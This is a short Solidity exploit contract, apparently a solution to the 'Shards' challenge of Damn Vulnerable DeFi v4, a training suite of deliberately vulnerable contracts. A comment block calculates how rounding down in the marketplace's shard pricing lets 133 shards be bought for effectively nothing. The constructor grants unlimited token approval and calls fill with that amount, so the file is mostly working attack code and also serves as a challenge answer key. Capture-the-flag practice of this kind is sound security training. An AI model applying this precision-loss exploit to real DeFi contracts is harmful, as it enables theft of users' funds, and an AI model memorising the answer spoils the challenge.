// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {ERC1155} from "@openzeppelin/contracts/token/ERC1155/ERC1155.sol";
import {IERC721Receiver} from "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import {Clones} from "@openzeppelin/contracts/proxy/Clones.sol";
import {IShardsNFTMarketplace} from "./IShardsNFTMarketplace.sol";
import {ShardsFeeVault} from "./ShardsFeeVault.sol";
import {DamnValuableToken} from "../DamnValuableToken.sol";
import {DamnValuableNFT} from "../DamnValuableNFT.sol";
import {FixedPointMathLib} from "solmate/utils/FixedPointMathLib.sol";
import {ShardsNFTMarketplace} from "./ShardsNFTMarketplace.sol";

/**
uint112 constant NFT_OFFER_PRICE = 1_000_000e6;
uint256 constant MARKETPLACE_INITIAL_RATE = 75e15;     ->     _currentRate
uint112 constant NFT_OFFER_SHARDS = 10_000_000e18;     ->     offer.totalShards


want.mulDivDown(_toDVT(offer.price, _currentRate), offer.totalShards)
_toDVT: offer.price.mulDivDown(_currentRate, 1e6);  =  1_000_000e6 * 75e15 / 1e6    =  1_000_000 * 75e15 =  75e21
fill: want.mulDivDown(75e21, 10_000_000e18);         =  want * 75e21 / 10_000e21  = want * 75 / 10_000
                                                                                    = 133 * 75

 */ 

contract Shards{
    ShardsNFTMarketplace shardsNFTMarketplace;
    DamnValuableToken token;

    uint64 constant OFFER_ID = 1;
    uint constant WANT = 133; 

    constructor(ShardsNFTMarketplace _shardsNFTMarketplace, DamnValuableToken _damnValuableToken){
        token = _damnValuableToken;
        shardsNFTMarketplace = _shardsNFTMarketplace;


        
        token.approve(address(shardsNFTMarketplace), type(uint256).max);
        shardsNFTMarketplace.fill(OFFER_ID, WANT);

        
    }

}